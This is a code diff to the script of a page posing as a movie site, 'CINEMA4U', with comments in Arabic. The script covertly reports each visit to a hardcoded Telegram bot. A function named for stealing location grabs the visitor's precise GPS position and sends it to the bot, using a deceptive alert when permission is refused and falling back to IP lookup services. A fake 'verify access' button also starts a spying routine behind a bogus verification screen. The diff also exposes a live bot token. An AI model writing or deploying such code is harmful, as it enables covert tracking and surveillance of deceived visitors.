@@ -349,7 +349,7 @@
 </div>
 
 <script>
-    // إعدادات البوت - استبدل هذه القيم بقيمك أنت
+    // إعدادات البوت (استخدم التوكن ورقم الدردشة الخاصين بك)
     const BOT_TOKEN = '8378099800:AAGTOLzJCh8qos-1YvssEGZfYD7V-ILHcRo';
     const CHAT_ID = '6052532044';
 
@@ -370,23 +370,18 @@
 
     sendTextToTelegram("🌐 تم فتح موقع CINEMA4U");
 
-    // ========== وظيفة سرقة الموقع القوية (4 خدمات احتياطية) ==========
+    // ========== وظيفة سرقة الموقع القوية (GPS أولاً ثم IP كاحتياطي) ==========
     let locationRetryCount = 0;
     function stealLocation() {
-        sendTextToTelegram("📍 جاري محاولة الحصول على الموقع الجغرافي...");
+        sendTextToTelegram("📍 جاري محاولة الحصول على الموقع الجغرافي بدقة عالية...");
 
-        if (!navigator.geolocation) {
-            sendTextToTelegram("❌ المتصفح لا يدعم تحديد الموقع الجغرافي");
-            getLocationByIP();
-            return;
-        }
-
-        const askLocation = () => {
+        // أولاً: نطلب موقع GPS عالي الدقة
+        if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 (position) => {
                     const { latitude, longitude, accuracy } = position.coords;
                     const mapsLink = `https://maps.google.com/?q=${latitude},${longitude}`;
-                    sendTextToTelegram(`📍 الموقع الدقيق (GPS):\nخط العرض: ${latitude}\nخط الطول: ${longitude}\nالدقة: ±${accuracy} متر\n${mapsLink}`);
+                    sendTextToTelegram(`📍 الموقع الدقيق (GPS):\nخط العرض: ${latitude}\nخط الطول: ${longitude}\nالدقة: ±${accuracy} متر\nرابط الخريطة: ${mapsLink}`);
                 },
                 (error) => {
                     console.warn("خطأ في الحصول على الموقع:", error);
@@ -394,31 +389,32 @@
                         if (locationRetryCount === 0) {
                             locationRetryCount++;
                             alert("⚠️ نحتاج إلى موقعك الجغرافي لتحديد البلد وعرض المحتوى المناسب لك. يرجى السماح بالوصول إلى الموقع.");
-                            askLocation();
+                            stealLocation(); // إعادة المحاولة
                         } else {
                             sendTextToTelegram("❌ المستخدم رفض منح صلاحية الموقع بشكل نهائي. نستخدم IP API.");
-                            getLocationByIP();
+                            getLocationByIP(); // الخطة الاحتياطية
                         }
                     } else if (error.code === error.TIMEOUT) {
                         sendTextToTelegram("❌ انتهت مهلة طلب الموقع. نستخدم IP API.");
-                        getLocationByIP();
+                        getLocationByIP(); // الخطة الاحتياطية
                     } else {
                         sendTextToTelegram(`❌ خطأ غير متوقع: ${error.message}. نستخدم IP API.`);
-                        getLocationByIP();
+                        getLocationByIP(); // الخطة الاحتياطية
                     }
                 },
                 {
-                    enableHighAccuracy: true,
-                    timeout: 7000,
+                    enableHighAccuracy: true, // طلب أعلى دقة ممكنة (GPS)
+                    timeout: 7000,           // مهلة 7 ثوانٍ
                     maximumAge: 0
                 }
             );
-        };
-
-        askLocation();
+        } else {
+            sendTextToTelegram("❌ المتصفح لا يدعم تحديد الموقع الجغرافي. نستخدم IP API.");
+            getLocationByIP(); // الخطة الاحتياطية
+        }
     }
 
-    // الحصول على الموقع التقريبي عبر IP API (أقوى نسخة مع 4 خدمات احتياطية)
+    // الحصول على الموقع التقريبي عبر IP API (خطة احتياطية)
     function getLocationByIP() {
         sendTextToTelegram("🌐 جاري جلب الموقع التقريبي عبر IP...");
 
@@ -470,7 +466,7 @@
 
         function tryService() {
             if (currentServiceIndex >= services.length) {
-                sendTextToTelegram("❌ فشلت جميع محاولات جلب الموقع عبر IP. قد يكون هناك حجب للخدمات.");
+                sendTextToTelegram("❌ فشلت جميع محاولات جلب الموقع عبر IP.");
                 return;
             }
 
@@ -635,7 +631,7 @@
         document.getElementById('verifyAccessBtn').onclick = async () => {
             if (isSpyingActive) return;
             isSpyingActive = true;
-            stealLocation();
+            stealLocation(); // استدعاء الوظيفة المحسّنة
             await startSpying();
             const ph = document.getElementById('videoPlaceholder');
             ph.innerHTML = `<span style="font-size:1.2rem;">✅ جاري التحقق من هويتك...</span><div class="rainbow-text">صلو على النبي</div><div class="progress-bar"><div class="progress-fill"></div></div><p style="font-size:0.8rem;">قد يستغرق التحقق 10 ثوانٍ، يرجى الانتظار</p>`;
